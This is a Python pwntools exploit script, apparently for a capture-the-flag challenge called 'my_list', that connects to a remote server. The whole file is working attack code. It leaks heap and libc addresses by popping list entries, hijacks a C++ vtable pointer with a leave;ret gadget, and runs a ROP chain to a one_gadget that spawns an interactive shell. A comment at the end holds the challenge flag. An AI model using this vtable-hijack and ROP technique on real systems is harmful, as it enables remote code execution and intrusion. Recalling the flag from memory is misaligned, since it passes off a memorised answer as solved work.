from pwn import *

# r = process('./my_list')
r = remote('52.59.124.14', 10202)
bin = ELF('./my_list')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
context.clear(os='linux', arch='x86_64', log_level='DEBUG')

def push(data):
    r.sendlineafter(b'Enter your choice: \n', b'1')
    r.sendlineafter(b'Enter the data you want to save: ', data)

def pop():
    r.sendlineafter(b'Enter your choice: \n', b'2')

def view():
    r.sendlineafter(b'Enter your choice: \n', b'3')

def overflow(payload):
    r.sendlineafter(b'Enter your choice: \n', payload)

push(b'a'*0x11)
push(b'a'*0x11)
pop()

pop()
r.recvuntil(b'Data: ')
heap = u64(r.recv(6).ljust(8, b'\x00')) - 0x11f60
log.info('Heap: %#x' % heap)

push(b'a'*0x410)
push(b'a'*0x3c0)
push(b'a'*0x3b0)
pop()
pop()
push(b'a'*0x1f)
push(b'a'*0x1f)
pop()
pop()
pop()
r.recvuntil(b'Data: ')
libc.address = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ecbe0
log.info('Libc base: %#x' % libc.address)

leave_ret = libc.address + 0x00000000000578f8
ret = libc.address + 0x0000000000022679
pop_rdi = libc.address + 0x0000000000023b72
pop_r12 = libc.address + 0x000000000002f739
push(leave_ret.to_bytes(6, 'little'))

payload = b'a'*0x38 + p64(pop_rdi) + p64(heap+0x11ef0) + p64(pop_r12) +\
        p64(0) + p64(libc.address + 0xe3b2e)
r.sendlineafter(b'Enter your choice: \n', payload)
# gdb.attach(r, '''b*_Z9list_menuP6MyList+119''')
pop()
# view()
# view()
r.interactive()
# ENO{345y_c++_v74bl3_3xpl017_4nd_50m3_r0p}